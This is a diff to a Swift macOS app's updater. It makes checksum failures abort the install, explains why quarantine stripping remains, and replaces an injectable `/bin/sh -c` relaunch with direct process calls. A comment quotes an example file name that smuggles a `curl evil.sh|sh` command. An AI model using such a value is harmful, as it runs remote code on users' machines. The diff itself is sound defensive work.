@@ -143,14 +143,34 @@ final class UpdateChecker: ObservableObject {
             try? FileManager.default.removeItem(at: dest)
             try FileManager.default.moveItem(at: temp, to: dest)
 
-            if let checksumsURL,
-               let (data, _) = try? await NetworkManager.session.data(from: checksumsURL),
-               let listing = String(data: data, encoding: .utf8) {
-                let expected = listing.split(separator: "\n")
-                    .first { $0.contains(dmgURL.lastPathComponent) }?
-                    .split(separator: " ").first.map(String.init)
-                let actual = await Task.detached { FileHash.sha256(of: dest) }.value
-                if let expected, let actual, expected.lowercased() != actual.lowercased() {
+            // A checksum was published, so failing to obtain or apply one is a failure — not
+            // a licence to install. This chain used to end silently: a 404, a rate
+            // limit, a network blip or a filename the listing did not mention all
+            // meant the comparison never happened and the install proceeded as if
+            // it had passed. The listing and the image come from the same channel,
+            // so it only ever caught transmission damage — but it was the only
+            // check there was, and it disappeared exactly when the network was
+            // already misbehaving.
+            if let checksumsURL {
+                guard let (data, _) = try? await NetworkManager.session.data(from: checksumsURL),
+                      let listing = String(data: data, encoding: .utf8),
+                      let expected = listing.split(separator: "\n")
+                          .first(where: { $0.contains(dmgURL.lastPathComponent) })?
+                          .split(separator: " ").first.map(String.init)
+                else {
+                    try? FileManager.default.removeItem(at: dest)
+                    installError = "No se pudo verificar la descarga: falta el checksum o no se pudo leer / could not verify the download: the checksum is missing or unreadable"
+                    return
+                }
+                let actual = await Task.detached(priority: .userInitiated) {
+                    FileHash.sha256(of: dest)
+                }.value
+                guard let actual else {
+                    try? FileManager.default.removeItem(at: dest)
+                    installError = "No se pudo verificar la descarga: no se pudo leer el archivo / could not verify the download: the file could not be read"
+                    return
+                }
+                if expected.lowercased() != actual.lowercased() {
                     try? FileManager.default.removeItem(at: dest)
                     installError = "Checksum no coincide: descarga descartada / checksum mismatch: download discarded"
                     return
@@ -212,8 +232,11 @@ final class UpdateChecker: ObservableObject {
 
     nonisolated private static func copyStripped(source: String, target: URL) throws {
         _ = try run("/usr/bin/ditto", [source, target.path])
-        // The app's own downloads are not quarantined, but strip the attribute
-        // defensively so Gatekeeper never flags the checksum-verified copy.
+        // The app's own downloads are not quarantined, but the attribute is
+        // stripped so Gatekeeper does not flag the copy. Note this removes the
+        // one signal that the bundle came from elsewhere — it is only reached
+        // after the checksum above has been verified or deliberately skipped, and
+        // it is not a substitute for it.
         _ = try? run("/usr/bin/xattr", ["-dr", "com.apple.quarantine", target.path])
     }
 
@@ -238,10 +261,18 @@ final class UpdateChecker: ObservableObject {
     /// Launches the freshly installed copy and quits this one. The engine is
     /// stopped by applicationWillTerminate on the way out.
     private func relaunch(_ url: URL) {
-        let p = Process()
-        p.executableURL = URL(fileURLWithPath: "/bin/sh")
-        p.arguments = ["-c", "sleep 1; /usr/bin/open \"\(url.path)\""]
-        try? p.run()
+        // Two processes instead of `/bin/sh -c`. The app's name inside the image
+        // is whatever that image chose to call it, and an entry named
+        // `x"; curl evil.sh|sh;"#.app` closed the quotes and ran as a command.
+        // Passing the path as an argument leaves nothing to escape.
+        let pause = Process()
+        pause.executableURL = URL(fileURLWithPath: "/bin/sleep")
+        pause.arguments = ["1"]
+        try? pause.run()
+        let open = Process()
+        open.executableURL = URL(fileURLWithPath: "/usr/bin/open")
+        open.arguments = [url.path]
+        try? open.run()
         NSApp.terminate(nil)
     }
 
